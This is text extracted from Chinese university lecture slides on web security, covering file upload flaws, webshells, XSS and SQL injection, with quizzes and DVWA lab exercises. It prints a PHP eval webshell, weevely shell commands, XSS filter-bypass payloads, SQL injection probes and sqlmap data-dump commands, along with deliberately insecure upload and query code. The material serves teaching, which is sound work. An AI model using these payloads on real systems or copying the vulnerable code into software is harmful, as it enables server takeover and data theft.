String query=”SELECT * FROM accts WHERE account=?”;
PreparedStatement pstmt=connection.prepareStatement(query, ...);
pstmt.setString(1,request.getParameter(“acct”));
ResultSet results=pstmt.executeQuery();
代码中通过一个未被验证的用户账号来获取相关数据，在这样的情况下，攻
击者可以通过在浏览器中简单修改“acct”参数的值发送到不同的用户账号来
获取信息。

### lecture08part1-Web安全.pdf / Page 91

3

安全配置错误
举例：未能及时对软件进行更新，默认的用户名密码没有及时修改等等

4

不安全的加密存储
所谓不安全的加密存储指的是Web应用系统没有对敏感性资料进行加密，或者
采用的加密算法复杂度不高可以被轻易破解，或者加密所使用的密钥非常容易
检测出来。
举例：CSDN网站泄密、Facebook用户信息泄密等

### lecture08part1-Web安全.pdf / Page 92

5

传输层保护不足

当传输层没有进行安全保护时，会遇到下面的安全威胁
会话
劫持

中间人
攻击

HTTP是无状态协议，客户端和服务端并没有建立长连接。
服务器为了识别用户连接，服务器会发送给客户端
SessionID。如果传输层保护不足，攻击就可以通过嗅探的
方法获取传输内容，提取SessionID，冒充受害者发送请求。
中间人攻击(Man-in-the-middle attack)，即MITM。
HTTP连接的目标是Web服务器，如果传输层保护
不足，攻击者可以担任中间人的角色，在用户和
Web服务器之间截获数据并在两者之间进行转发，
使用户和服务器之间的整个通信过程暴露在攻击
者面前。

### lecture08part1-Web安全.pdf / Page 93

单选题

1分

窃取用户SessionID后，使用该SessionID登录进入目标账户的攻击方
法是

A

会话保持攻击

B

会话劫持攻击

C

中间人攻击

D

传输层攻击
提交

## 来源：lecture08part2-Web安全.pdf

### lecture08part2-Web安全.pdf / Page 1

第十一章 WEB渗透实战基础
知识点一：文件上传漏洞
知识点二：跨站脚本攻击

### lecture08part2-Web安全.pdf / Page 2

知识点一：文件上传漏洞

### lecture08part2-Web安全.pdf / Page 3

文件上传漏洞
指网络攻击者上传了一个可执行的文件到服务器并执行。这里上传的文件可以是木马，病
毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，部分文件上传漏洞的
利用技术门槛非常的低，对于攻击者来说很容易实施。

u 这里需要特别说明的是上传漏洞的利用经常会使用WebShell，而WebShell的植入远不
止文件上传这一种方式。

### lecture08part2-Web安全.pdf / Page 4

文件上传漏洞

服务器未限制上传文件内容
攻击者上传可执行代码
被服务器执行

### lecture08part2-Web安全.pdf / Page 5

文件上传漏洞

用户上传头像/图片/文档
服务器保存数据
攻击者上传脚本（PHP/JSP/ASP）
服务器执行代码

### lecture08part2-Web安全.pdf / Page 7

文件上传漏洞
1

发现上传点
2

上传恶意文件
3

文件放到Web目录
4

通过浏览器访问执行

### lecture08part2-Web安全.pdf / Page 8

文件上传漏洞
1

发现上传点

### lecture08part2-Web安全.pdf / Page 9

文件上传漏洞
1

发现上传点
2

上传恶意文件

### lecture08part2-Web安全.pdf / Page 10

WebShell
WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种
命令执行环境，也可以将其称之为一种网页后门

### lecture08part2-Web安全.pdf / Page 11

WebShell
WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种
命令执行环境，也可以将其称之为一种网页后门
攻击者在入侵了一个网站后，通常
会将这些asp或php后门文件与网站
服务器web目录下正常的网页文件混
在一起，然后使用浏览器来访问这
些后门，得到一个命令执行环境，
以达到控制网站服务器的目的（可
以上传下载或者修改文件，操作数
据库，执行任意命令等）。

p WebShell后门隐蔽较性高，可以轻
松穿越防火墙，访问WebShell时不会
留下系统日志，只会在网站的web日
志中留下一些数据提交记录，没有经
验的管理员不容易发现入侵痕迹。
p 攻击者可以将WebShell隐藏在正常
文件中并修改文件时间增强隐蔽性，
也可以采用一些函数对WebShell进行
编码或者拼接以规避检测。

### lecture08part2-Web安全.pdf / Page 12

test.php
<?php eval($_POST['uname']); ?>
<form id="form1" name="form1" method="post"
action="test.php">
<input name="uname" type="text" id="uname" />
<input type="submit" name="Submit" value="提交" />
</form>

### lecture08part2-Web安全.pdf / Page 13

test.php
<?php eval($_POST['uname']); ?>
<form id="form1" name="form1" method="post"
action="test.php">
<input name="uname" type="text" id="uname" />
<input type="submit" name="Submit" value="提交" />
</form>

读取用户提交的uname数据，当成代码执行

### lecture08part2-Web安全.pdf / Page 14

test.php
<?php eval($_POST['uname']); ?>
<form id="form1" name="form1" method="post"
action="test.php">
<input name="uname" type="text" id="uname" />
<input type="submit" name="Submit" value="提交" />
</form>

生成表单，让用户输入内容后提交

### lecture08part2-Web安全.pdf / Page 15

输入作为uname的值 使用POST请求提交

test.php

<?php eval($_POST['uname']); ?>
<form id="form1" name="form1" method="post"
action="test.php">
<input name="uname" type="text" id="uname" />
<input type="submit" name="Submit" value="提交" />
</form>

生成表单，让用户输入内容后提交

### lecture08part2-Web安全.pdf / Page 16

文件上传漏洞
1

发现上传点
2

上传恶意文件

### lecture08part2-Web安全.pdf / Page 17

文件上传漏洞
1

发现上传点
2

上传恶意文件

全局数组，存储客户端通过HTTP POST提交的数据

### lecture08part2-Web安全.pdf / Page 18

文件上传漏洞
1

发现上传点
2

上传恶意文件

### lecture08part2-Web安全.pdf / Page 19

文件上传漏洞
1

发现上传点
2

上传恶意文件

执行

### lecture08part2-Web安全.pdf / Page 20

文件上传漏洞
1

发现上传点
2

上传恶意文件
3

文件放到Web目录

### lecture08part2-Web安全.pdf / Page 21

文件上传漏洞
1

发现上传点
2

上传恶意文件
3

攻击者访问网址，POST
phpinfo()被执行

文件放到Web目录
4

通过浏览器访问执行

### lecture08part2-Web安全.pdf / Page 23

Ø 在输入框中输入“phpinfo();”运行后：

### lecture08part2-Web安全.pdf / Page 24

test.php
<?php eval($_POST['uname']); ?>
<form id="form1" name="form1" method="post"
action="test.php">
<input name="uname" type="text" id="uname" />
<input type="submit" name="Submit" value="提交" />
</form>

后门程序
将代码通过参数传入并执行

### lecture08part2-Web安全.pdf / Page 25

为什么WebShell这么关键？
持久控制（后门）

隐蔽性强

绕过防火墙

• 执行系统命令

• 混在正常文件里

• 访问方式是HTTP

• 操作数据库

• 修改时间伪装

• 不需要额外端口

• 上传/下载文件

• 编码/拼接绕过检测

• 横向移动

### lecture08part2-Web安全.pdf / Page 26

上传文件是病毒或者木马时

主要用于诱骗用户或者管理员下载
执行或者直接自动运行

### lecture08part2-Web安全.pdf / Page 27

上传文件是病毒或者木马时

主要用于诱骗用户或者管理员下载
执行或者直接自动运行

### lecture08part2-Web安全.pdf / Page 28

主要用于诱骗用户或者管理员下载
执行或者直接自动运行

上传文件是病毒或者木马时

下载后的恶意程序
可以做什么？

•
•
•
•
•

安装持久化（写入启动项、修改注册表）
下载更多恶意组件
控制你的机器
窃取数据
破坏或勒索

### lecture08part2-Web安全.pdf / Page 29

上传文件是病毒或者木马时

主要用于诱骗用户或者管理员下载
执行或者直接自动运行

上传文件是WebShell时

攻击者可通过这些网页后门执行命令
并控制服务器

### lecture08part2-Web安全.pdf / Page 30

上传文件是病毒或者木马时

主要用于诱骗用户或者管理员下载
执行或者直接自动运行

上传文件是WebShell时

上传文件是其他恶意脚本时

攻击者可通过这些网页后门执行命令
并控制服务器

攻击者可直接执行脚本进行攻击

### lecture08part2-Web安全.pdf / Page 31

上传文件是病毒或者木马时

主要用于诱骗用户或者管理员下载
执行或者直接自动运行

上传文件是WebShell时

上传文件是其他恶意脚本时

攻击者可通过这些网页后门执行命令
并控制服务器

攻击者可直接执行脚本进行攻击

上传文件是恶意图片时

1

伪装图片 shell.php.jpg

2

真正图片 + 嵌入payload

图片中可能包含了脚本，加载或者点击
这些图片时脚本会悄无声息的执行

### lecture08part2-Web安全.pdf / Page 32

上传文件是病毒或者木马时

主要用于诱骗用户或者管理员下载
执行或者直接自动运行

上传文件是WebShell时

上传文件是其他恶意脚本时

攻击者可直接执行脚本进行攻击

上传文件是恶意图片时

1
2

攻击者可通过这些网页后门执行命令
并控制服务器

图片中可能包含了脚本，加载或者点击
这些图片时脚本会悄无声息的执行

伪装图片 shell.php.jpg
真正图片 + 嵌入payload

例如，图片metadata中嵌入JS
或者，SVG中嵌入JS

### lecture08part2-Web安全.pdf / Page 33

上传文件是病毒或者木马时

主要用于诱骗用户或者管理员下载
执行或者直接自动运行

上传文件是WebShell时

上传文件是其他恶意脚本时

攻击者可直接执行脚本进行攻击

上传文件是恶意图片时
上传文件是伪装成正常
后缀的恶意脚本时

攻击者可通过这些网页后门执行命令
并控制服务器

图片中可能包含了脚本，加载或者点击
这些图片时脚本会悄无声息的执行

攻击者可借助本地文件包含漏洞(Local File Include，
LFI)执行该文件

### lecture08part2-Web安全.pdf / Page 34

上传文件是病毒或者木马时

主要用于诱骗用户或者管理员下载
执行或者直接自动运行

上传文件是WebShell时

上传文件是其他恶意脚本时

攻击者可直接执行脚本进行攻击

上传文件是恶意图片时
上传文件是伪装成正常
后缀的恶意脚本时

攻击者可通过这些网页后门执行命令
并控制服务器

图片中可能包含了脚本，加载或者点击
这些图片时脚本会悄无声息的执行

攻击者可借助本地文件包含漏洞(Local File Include，
LFI)执行该文件

PHP的include函数不看后缀，只要内容是PHP代码，就执行

### lecture08part2-Web安全.pdf / Page 35

文件上传漏洞原理
大部分的网站和应用系统都有上传功能，如用户头像上传，图片上传，文档上传等。

一些文件上传功能实现代码没有严格限制用户上传
的文件后缀以及文件类型，导致允许攻击者向某个
可通过Web访问的目录上传任意PHP文件，并能够
将这些文件传递给PHP解释器，就可以在远程服务
器上执行任意PHP脚本。
当系统存在文件上传漏洞时攻击者可以将病毒，木马，
WebShell，其他恶意脚本或者是包含了脚本的图片上
传到服务器，这些文件将对攻击者后续攻击提供便利。
根据具体漏洞的差异，此处上传的脚本可以是正常后
缀的PHP，ASP以及JSP脚本，也可以是篡改后缀后的
这几类脚本。

### lecture08part2-Web安全.pdf / Page 36

一个php文件上传代码如下：
<form action="" enctype="multipart/form-data" method="post"
name="uploadfile">上传文件：<input type="file" name="upfile" /><br>
<input type="submit" value="上传" /></form>
<?php
if( is_uploaded_file($_FILES['upfile']['tmp_name'])){
$upfile=$_FILES["upfile"];
//获取数组里面的值
$name=$upfile["name"];//上传文件的文件名
$type=$upfile["type"];//上传文件的类型
$size=$upfile["size"];//上传文件的大小
$tmp_name=$upfile["tmp_name"];//上传文件的临时存放路径
$error=$upfile["error"];//上传后系统返回的值
//把上传的临时文件移动到up目录下面
move_uploaded_file($tmp_name,'up/'.$name);
$destination="up/".$name;
echo $destination;
} ?>

### lecture08part2-Web安全.pdf / Page 37

单选题

1分

文件上传漏洞产生的原因是

A

滥用了文件上传插件

B

缺少上传文件信息的输入检测

C

缺少对一句话木马的检测机制

D

缺少对Webshell的检测机制
提交

### lecture08part2-Web安全.pdf / Page 38

实验一
安装OWASP测试环境，在其中的DVWA里实现一句话木马的上传。并用
Kail Linux中的自带的webshell工具weevely连接后门，获取服务器权限。
开放式Web应用程序安全项目(Open Web Application Security Project, OWASP)是世界上
最知名的Web安全与数据库安全研究组织，该组织分别在2007年、2010年和2013年统计
过十大Web安全漏洞。我们基于OWASP发布的开源虚拟镜像“OWASP Broken Web
Applications VM”来演示如何利用文件上传漏洞。

### lecture08part2-Web安全.pdf / Page 39

通过用户名user密码user登录，将网页左下端的DVWA Security设置为Low。然后选择Upload，如下：

### lecture08part2-Web安全.pdf / Page 40

然后，打开Kali Linux终端，输入命令weevely，可以看到基本的使用方法。效果如下：

### lecture08part2-Web安全.pdf / Page 41

按照提示的使用方法，输入命令weevely generate pass shell.php 来生成一句话木马shell.php，连接密
码是pass。执行效果如下：

相比一句话木马，所产生的webshell将具有更强大的后门能力、免杀能力

### lecture08part2-Web安全.pdf / Page 42

回到上传页面点击Browse按钮，将我们生成的文件shell.php进行上传。效果如下：

可以看到⽂件上传成功，并且页面回显出我们上传⽂件的路径。

### lecture08part2-Web安全.pdf / Page 43

打开终端，使用命令weevely http://192.168.209.136/dvwa/hackable/uploads/shell.php pass连接后门，拿
到服务器权限。这个时候就相当于ssh远程连接了服务器，可以任意命令执行了，效果如下：

执行ls命令，可以看到当前目录下的文件，其中就有我们上传的shell.php。

### lecture08part2-Web安全.pdf / Page 44

实验二

点击View Source查看上传文件的源代码，比较三种不同安全级别的代码有什么不同？？
思考要做到安全的文件上传，服务端应该从哪些角度对用户上传的文件进行检测。

### lecture08part2-Web安全.pdf / Page 45

知识点二：跨站脚本攻击

### lecture08part2-Web安全.pdf / Page 46

XSS在OWASP 2013年度Web应用程序十大漏洞中位居第三。Web应用程序经常
存在XSS漏洞。跨站脚本攻击与SQL注入攻击区别在于：XSS主要影响的是
Web应用程序的用户，而SQL注入则主要影响Web应用程序自身。

### lecture08part2-Web安全.pdf / Page 47

跨站脚本攻击（Cross-Site Scripting, XSS）

攻击者把恶意Javascript代码
注入网页中
让用户浏览器执行

### lecture08part2-Web安全.pdf / Page 48

跨站脚本攻击（Cross-Site Scripting, XSS）

•
•
•
•

窃取Cookie
冒充用户操作
篡改页面内容
跳转钓鱼网站

### lecture08part2-Web安全.pdf / Page 49

1 “脚本”的含义
现在大多数网站都使用JavaScript或VBScript来执行计算、页面格式化、cookie
管理以及其他客户动作。这类脚本是在浏览网站的用户的计算机（客户机）上
运行的，而不是在Web服务器自身中运行。

### lecture08part2-Web安全.pdf / Page 52

代码会被写入当前页面
被解析执行

XSS

### lecture08part2-Web安全.pdf / Page 53

2

跨站脚本的含义
XSS根据其特征和利用手法的不同，主要分成两大类型：

反射式
XSS

反射式跨站脚本也称作非持久型、参数型跨站脚本。
主要用于将恶意脚本附加到URL地址的参数中，下
面是一个简单的存在漏洞的php页面：

### lecture08part2-Web安全.pdf / Page 55

查看URL是否存在name参数
以及name值是否为NULL或空

### lecture08part2-Web安全.pdf / Page 56

危险操作

### lecture08part2-Web安全.pdf / Page 57

http://site.com/page.php?name=<script>alert(1)</script>
XSS

### lecture08part2-Web安全.pdf / Page 58

XSS
Hello <script>alert(1)</script>

服务器返回给浏览器的HTML
内容变成了上面这样

### lecture08part2-Web安全.pdf / Page 60

攻击者输入如下脚本:<script>alert(‘xss’)</script>

### lecture08part2-Web安全.pdf / Page 61

攻击者输入如下脚本:<script>alert(‘xss’)</script>

### lecture08part2-Web安全.pdf / Page 62

核心问题

没有对用户输入做过滤/转义
直接输出至HTML

### lecture08part2-Web安全.pdf / Page 63

如何修复？

### lecture08part2-Web安全.pdf / Page 64

echo 'Hello ' . htmlspecialchars($_GET['name']);

### lecture08part2-Web安全.pdf / Page 65

htmlspecialchars函数做什么？

### lecture08part2-Web安全.pdf / Page 66

无害script代码不也转义
变成不可执行了？

echo 'Hello ' . htmlspecialchars($_GET['name']);

### lecture08part2-Web安全.pdf / Page 67

无害script代码不也转义
变成不可执行了？
区分“谁写的代码”

echo 'Hello ' . htmlspecialchars($_GET['name']);

### lecture08part2-Web安全.pdf / Page 68

存储式跨站脚本又称为持久型跨站脚本，比反射式跨站脚本更
具有威胁性，并且可能影响到Web服务器自身的安全。
存储式
XSS

p 存储式XSS与反射式XSS类似的地方在于，会在Web应用程
序的网页中显示未经编码的攻击者脚本。
p 它们的区别在于，存储式XSS中的脚本并非来自于Web应用
程序请求；相反，脚本是由Web应用程序进行存储的，并且
会将其其作为内容显示给浏览用户。

例如，如果论坛或博客网站允许用户上传内容而不进行适当的有
效性检查或编码，那么这个网站就容易受到存储式XSS攻击。

### lecture08part2-Web安全.pdf / Page 69

反射型
只影响当前请求

存储型
以后还会被取出来显示

### lecture08part2-Web安全.pdf / Page 70

1

攻击者提交恶意数据

### lecture08part2-Web安全.pdf / Page 71

1

攻击者提交恶意数据

2

服务器存入数据库

### lecture08part2-Web安全.pdf / Page 72

1

攻击者提交恶意数据

2

服务器存入数据库

3

普通用户访问评论页

### lecture08part2-Web安全.pdf / Page 73

1

攻击者提交恶意数据

2

服务器存入数据库

3

4

普通用户访问评论页

服务器返回页面

### lecture08part2-Web安全.pdf / Page 74

在这个示例中，我们向该留言板提交攻击脚本，该脚本会存储在其后台数据库服务器，每当用
户查看留言板时，则会弹出对话框：

### lecture08part2-Web安全.pdf / Page 75

XSS的攻击途径
上面演示的XSS攻击只是显示一个警告框，但是在现实的攻击案例中，攻击者有可能进行
更具破坏性的攻击。例如。恶意脚本可以将cookie值上传到攻击者的网站，从而有可能让
攻击者以该用户的身份登入或恢复正在进行中的会话。脚本还可以改写页面内容，使其看
上去已经被涂鸦。

### lecture08part2-Web安全.pdf / Page 76

JavaScript还可以轻易地实施下面的任何攻击：

通过cookie窃取实现会话劫持

按键记录，将所有输入的文本
发送到攻击者网站

向网页中注入链接或广告

JavaScript
攻击

立即将网页重定向到恶意网站

窃取用户登录凭证

网站涂改
等等

### lecture08part2-Web安全.pdf / Page 77

跨站脚本攻击的危害
一般来说，存储式XSS的风险会高于反射式XSS。因为存储式XSS会保存在服务器上，有
可能会跨页面存在。它不改变页面URL的原有结构，因此有时候还能逃过一些IDS的检测。
比如IE8的XSS Filter和Firefox的Noscript Extension，都会检查地址栏中的地址是否包含
XSS脚本。而跨页面的存储式XSS可能会绕过这些检测工具。

### lecture08part2-Web安全.pdf / Page 78

跨站脚本攻击的危害
从攻击过程来说，反射式XSS一般要求攻击者诱使用户点击一个包含XSS代码的URL链接；
而存储式XSS则只需让用户查看一个正常的URL链接，而这个链接中存储了一段脚本。比
如一个Web邮箱的邮件正文页面存在一个存储式XSS漏洞，当用户打开一封新邮件时，
XSS Payload会被执行。这样的漏洞极其隐蔽，且埋伏在用户的正常业务中，风险颇高。

### lecture08part2-Web安全.pdf / Page 79

单选题

1分

有关反射式跨站脚本，说法错误的是

A

可以在客户端浏览器中执行

B

通过附加URL参数来实施攻击

C

非持久型跨站脚本

D

能逃过基于URL地址的跨站脚本检测
提交

### lecture08part2-Web安全.pdf / Page 80

实验三
对如下示例代码的php网页进行XSS攻击，实现简单的弹窗效果即可
<!DOCTYPE html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()
{
confirm("Congratulations~");
}
</script>
</head>
<body>

### lecture08part2-Web安全.pdf / Page 81

<h1 align=center>--Welcome To The Simple XSS Test--</h1>
<?php
ini_set("display_errors", 0);
$str =strtolower( $_GET["keyword"]);
$str2=str_replace("script","",$str);
$str3=str_replace("on","",$str2);
$str4=str_replace("src","",$str3);
echo "<h2 align=center>Hello ".htmlspecialchars($str).".</h2>".'<center>
<form action=xss_test.php method=GET>
<input type=submit name=submit value=Submit />
<input name=keyword value="'.$str4.'">
</form>
</center>';
?>
</body>
</html>

### lecture08part2-Web安全.pdf / Page 82

首先从黑盒测试的角度来进行实验
访问URL：http://192.168.19.131/xss_test.php
页面显示效果如下：

### lecture08part2-Web安全.pdf / Page 83

如图可以看到一个Submit按钮和输入框，并且还有标题提示XSS。于是输入上面
学过最简单的XSS脚本：<script>alert('xss')</script>来进行测试。点击Submit按钮
以后，效果如下：

### lecture08part2-Web安全.pdf / Page 84

结果发现Hello后面出现了我们输入的内容，并且输入框中的回显过滤了script关键
字，这个时候考虑后台只是最简单的一次过滤。于是可以利用双写关键字绕过，
构造脚本：<scrscriptipt>alert('xss')</scscriptript>测试。执行效果如下：

### lecture08part2-Web安全.pdf / Page 85

现虽然输入框中的回显确实是我们想要攻击的脚本，但是代码并没有执行。因为
在黑盒测试情况下，我们并不能看到全部代码的整个逻辑，所以无法判断问题到
底出在哪里。这个时候我们可以在页面点击右键查看源码，尝试从源码片段中分
析问题。右键源码如下：
如果可以成功执行alert函数的话，页面将
会跳出一个确认框，显示Congratulations~

Htmlspecialchars函数可以有效防止XSS脚
本攻击，是一个过滤函数，实现预定义字
符的转换

分析这行代码知道，虽然我们成功的插入
了<script></script>标签组,但是我们并没有
跳出input的标签，使得我们的脚本仅仅可
以回显而不能利用。

### lecture08part2-Web安全.pdf / Page 86

这个时候的思路就是想办法将前面的<input>标签闭合，于是构造如下脚本：
"><scrscriptipt>alert('XSS')</scscriptript><!—
弹处确认框，XSS攻击成功。执行效果如下：

重要提醒：如果实践过程出现错误，通常表现为输入的双引号不能正常被
处理，是因为php服务器自动会对输入的双引号等进行转义，以预防用户
构造特殊输入进行攻击，比如本实验所进行的攻击。为了确保实验可以成
功运行，请在phpnow安装目录下搜索文件php-apache2handler.ini，并将
“magic_quotes_gpc = On”设置为“magic_quotes_gpc = Off”。

### lecture08part2-Web安全.pdf / Page 87

扩展思考
必须是javascript脚本吗？
这里就再为大家提供一种使用<img>标签的脚本构造方法：
<img src=ops! onerror="alert('XSS')">
<img>标签是用来定义HTML中的图像，src一般是图像的来源。而onerror
事件会在文档或图像加载过程中发生错误时被触发。所以上面这个攻击
脚本的逻辑是，当img加载一个错误的图像来源ops!时，会触发onerror事
件，从而执行alert函数。
请同学们继续实验并与大家分享经验……

## 来源：lecture08part3-Web安全.pdf

### lecture08part3-Web安全.pdf / Page 1

第十一章 WEB渗透实战基础
知识点一：SQL注入漏洞
知识点二：SQLMAP
知识点三：SQL盲注
知识点四：SQL注入的防御措施

### lecture08part3-Web安全.pdf / Page 2

知识点一：SQL注入漏洞

### lecture08part3-Web安全.pdf / Page 3

SQL语法
SQL是用于访问和处理数据库的标准的计算机语言。SQL是二十世纪七十年代由IBM创建的，
于1992年作为国际标准纳入ANSI。
数据定义
语言
（DDL）

DDL用于定义数据库结构

数据操作
语言
（DML）

DML用于对数据库进行查询或更新

SQL由
两部分组成

### lecture08part3-Web安全.pdf / Page 4

DDL的主要指令有

CREATE DATABASE

创建新数据库

ALTER DATABASE

CREATE TABLE

创建新表

ALTER TABLE

DROP TABLE

修改数据库

删除表

变更（改变）数据库表

### lecture08part3-Web安全.pdf / Page 5

DML的主要指令有

SELECT

从数据库表中获取数据

UPDATE

更新数据库表中的数据

DELETE

从数据库表中删除数据

INSERT INTO

向数据库表中插入数据

几个关键的SQL命令
SELECT [column-names] FROM [table-name];
[select-statement] UNION [select-statement];
EXEC [sql-command-name][arguments to command]

### lecture08part3-Web安全.pdf / Page 6

需要使用一些特殊的字符来构建SQL语句

’ ’ 字符串指示器(‘string’)
;

语句终结符

||

对于Oracle、PostgreSQL而言为连接（合并）

--

注释（单行）

#

注释（单行）

/**/

注释（多行）

### lecture08part3-Web安全.pdf / Page 7

注入原理
SQL注入是一种将SQL代码插入或添加到应用（用户）的输入参数中的攻击，之后再将这些参数传
递给后台SQL服务器加以解析并执行。

数据库驱动的
Web应用通常
包含三层

表示层

Web浏览器或呈现引擎

逻辑层

如C#、ASP、.NET、PHP、JSP等编程语言

存储层

如Microsoft SQL Server、MySQL、Oracle等数据库

Web浏览器（表示层）向中间层（Web服务器）发送请求，中间层通过查询、更新数据库（存储层）来
响应该请求。
当用户通过Web表单提交数据时，如果输入框的值没有经过有效性检查，则这些数据将会作为SQL查询
的一部分。

### lecture08part3-Web安全.pdf / Page 8

例如
如果一个网页的表单通过如下代码实现
<form action=”xxx.php”method=”GET”>
<input type=”text” name=”user”/>
<input type=”text” name=”passwd”>
<input type=”submit”/>
</form>

核心代码如下

<?php
/*…*/
$sql="select * from table where user=$_GET[“user”] and
password=$_GET[“passwd”]";
$result=mysql_query($sql);//执行查询
/*…*/
?>

### lecture08part3-Web安全.pdf / Page 9

当用户通过浏览器向表单提交了用户名“bob”，密码“abc123”时，那么下面的HTTP查
询将被发送给Web服务器：

http://xxxx.com/xxx.php?user=bob&passwd=abc123

当Web服务器收到这个请求时，将构建并执行一条（发送给数据库服务器的）SQL查询。
在这个示例中，该SQL请求如下所示：

SELECT * FROM table WHERE user=’bob’ and password=’abc123’

### lecture08part3-Web安全.pdf / Page 10

但是，如果用户发送的请求的user是修改过的SQL查询，那么这个模式就可能会导致
SQL注入安全漏洞。
例如，如果用户将user的内容
以“bob ’--”来提交，则单
引号用于截断前面的字符串，
注释符--后面的内容将会被注
释掉，如下所示：

http://xxxx.com/xxx.php?user=bob’-&passwd=xxxxxx

Web应用程序会构建并发送下
面这条SQL查询：

SELECT * FROM table WHERE user=’bob’--’ and
password=’abc123’

这样，注释符--后面的内容将会被完全注释掉，也就是说，对于伪造bob的用户，并不需求提供正确
的密码，就可以查询到bob的相关信息。

### lecture08part3-Web安全.pdf / Page 11

寻找注入点
如果要对一个网站进行SQL注入攻击，首先需要找到存在SQL注入漏洞的地方，也就是注入点。
可能的SQL注入点一般存在于登录页面、查找页面或添加页面等用户可以查找或修改数据的地
方。
GET型的请求最容易被注入
通 常 我 们 关 注 ASP,JSP,CGI 或 PHP 的 网 页 ， 尤 其 是 URL 中 携 带 参 数 的 ， 例 如 :
http://xxx/xxx.asp?id=numorstring。其中，参数可以是整数类型的也可以是字符串类型的。

我们以数字类型为例，进行以下的讲解。
如果下面两个方法能成功，说明存在SQL注入漏洞，也就是他们对输入信息并没有做有效的筛
查和处理。

### lecture08part3-Web安全.pdf / Page 12

一段有问题的代码
<?php
$con=mysql_connect("localhost","root","lenovo");
if(!$con){die(mysql_error());}
mysql_select_db("products",$con);
$sql="select * from category where id=$_GET[id]";
echo $sql."<br>";
$result=mysql_query($sql,$con);
while($row=mysql_fetch_array($result,MYSQL_NUM))
{
echo $row[0]." ".$row[1]." ".$row[2] ."<br>";
}
mysql_free_result($result);
mysql_close($con);
?>

### lecture08part3-Web安全.pdf / Page 13

“单引号”法
在URL参数后添加一个单引号，若存在注入点则通常会返回一个错误，例如，下列错误通
常表明存在MySQL注入漏洞：

You have an error in your SQL syntax; check the manual that corresponds to
your MySQL server version for the right syntax to use near ''' at line 1
如果攻击者使用单引号注入http://localhost/test.php?id=1’ ，那么最终的语句将变为：
select * from category where id=1‘
这将导致SQL语句执行失败且mysql_query函数不会返回任何值，后面如果有
mysql_fetch_array将返回给用户一条警告信息。

### lecture08part3-Web安全.pdf / Page 14

“永真永假”法
“单引号”法很直接，也很简单，但是对SQL注入有一定了解的程序员在编写程序时，都
会将单引号过滤掉。如果再使用单引号测试，就无法检测到注入点了。这时，就可以使用
经典的“永真永假”法。
当与上一个永真式使逻辑不受影响时，页面应当与原页面相同。
例如，http://localhost/test.php?id=1 and 1=1，传递给后台数据库服务器的SQL语句则变为：
select * from category where id=1 and 1=1，并不影响原逻辑；

而与上一个永假式时，则会影响原逻辑，页面可能出错或跳转（这与设计者的设计有关）。
例如，http://localhost/test.php?id=1 and 1=2，传递给后台数据库服务器的SQL语句则变为：
select * from category where id=1 and 1=2。

### lecture08part3-Web安全.pdf / Page 15

单选题

1分

单引号法测试注入点的原理是

A

验证程序是否对输入进行了验证

B

检查SQL语法是否正确

C

验证HTTP的请求方式是否为GET

D

验证SQL逻辑是否正确
提交

### lecture08part3-Web安全.pdf / Page 16

知识点二：SQLMAP

### lecture08part3-Web安全.pdf / Page 17

3

SQLMap
Sqlmap是一款开源的命令行自动化SQL注入工具，用Python开发而成，kali中系统已装有
sqlmap；而如果在windows下使用，则需要安装Python环境。下面介绍Sqlmap最为常用的命令：

Sqlmap -u url找到注入点
sqlmap -u url –users
列出数据库用户
sqlmap -u url --dbs 列
出数据库

或者 sqlmap -u url --current-db
显示当前数据库

Sqlmap最为常
用的命令：
或者sqlmap -u url --current-user
当前数据库用户

### lecture08part3-Web安全.pdf / Page 18

3

SQLMap
Sqlmap是一款开源的命令行自动化SQL注入工具，用Python开发而成，kali中系统已装有
sqlmap；而如果在windows下使用，则需要安装Python环境。下面介绍Sqlmap最为常用的命令：

sqlmap -u url --tables -D “testdb”
列出testdb数据库的表

Sqlmap最为常
用的命令：
sqlmap -u url --columns -T "user" -D
"testdb" 列出testdb数据库user表的列

sqlmap -u url --dump -C
“id,username,password” -T
“user” -D “testdb”

列出testdb数据 库user表的
id,username,password这几列的数据

### lecture08part3-Web安全.pdf / Page 19

4

具体实践
开放式Web应用程序安全项目(Open Web Application Security Project, OWASP)是世界上最知名的
Web安全与数据库安全研究组织，该组织分别在2007年、2010年和2013年统计过十大Web安全
漏洞。我们基于OWASP发布的开源虚拟镜像“OWASP Broken Web Applications VM”来演示如
何寻找SQL注入漏洞。

### lecture08part3-Web安全.pdf / Page 20

首先，在虚拟机加载该虚拟映像。启动该虚拟机后将显示其IP地址，在本机浏览器打开该地址
即可访问，如下图所示，我们选择Damn Vulnerable Web Application，通过用户名user密码user
登录，选择SQL Injection。同时，将网页左下端的DVWA Security设置为low。

### lecture08part3-Web安全.pdf / Page 21

接下来判断是否能够进行注入，通过“单引号”法进行测试，在提交栏里输入一个单引号，发
现报错，错误信息为：You have an error in your SQL syntax; check the manual that corresponds to
your MySQL server version for the right syntax to use near ''''' at line 1，初步认定可以注入。
接下来，我们通过Sqlmap进行自动化注入。

### lecture08part3-Web安全.pdf / Page 22

意味着，要能访问sqli页面，需要通过login.php优先登录，登录后才可以访问。因此，需要获取
登录权限才可以。但假定我们难以猜测得到用户口令和密码，但我们可以想办法获取其cookie
值，实现会话劫持。

### lecture08part3-Web安全.pdf / Page 23

打开本地代理服务器Paros：

### lecture08part3-Web安全.pdf / Page 24

设置代理：

### lecture08part3-Web安全.pdf / Page 25

在网页的输入框中，输入123，选择提交后，查看Paros拦截到的数据包信息。

### lecture08part3-Web安全.pdf / Page 26

记录其url和cookie信息
http://192.168.32.134/dvwa/vulnerabilities/sqli/?id=2&Submit=Submit

判定注入

### lecture08part3-Web安全.pdf / Page 27

列举数据库

### lecture08part3-Web安全.pdf / Page 28

列举表

列举列

### lecture08part3-Web安全.pdf / Page 29

列举数据

### lecture08part3-Web安全.pdf / Page 30

单选题

1分

sqlmap -u url --tables -D “testdb”语句的作用是

A

检查url是否存在SQL注入点

B

通过SQL注入列举所有的数据库

C

通过SQL注入列举数据库testdb的所有表

D

通过SQL注入列举所有数据库和所有表
提交

### lecture08part3-Web安全.pdf / Page 31

知识点三：SQL盲注

### lecture08part3-Web安全.pdf / Page 32

1

SQL盲注
上面的实验已经证明了SQL注入的危害性，通过工具SQLMap可以轻松的获取数据库的所有表、
列和数据，读者可能也有疑惑，它是如何达到目的的呢？
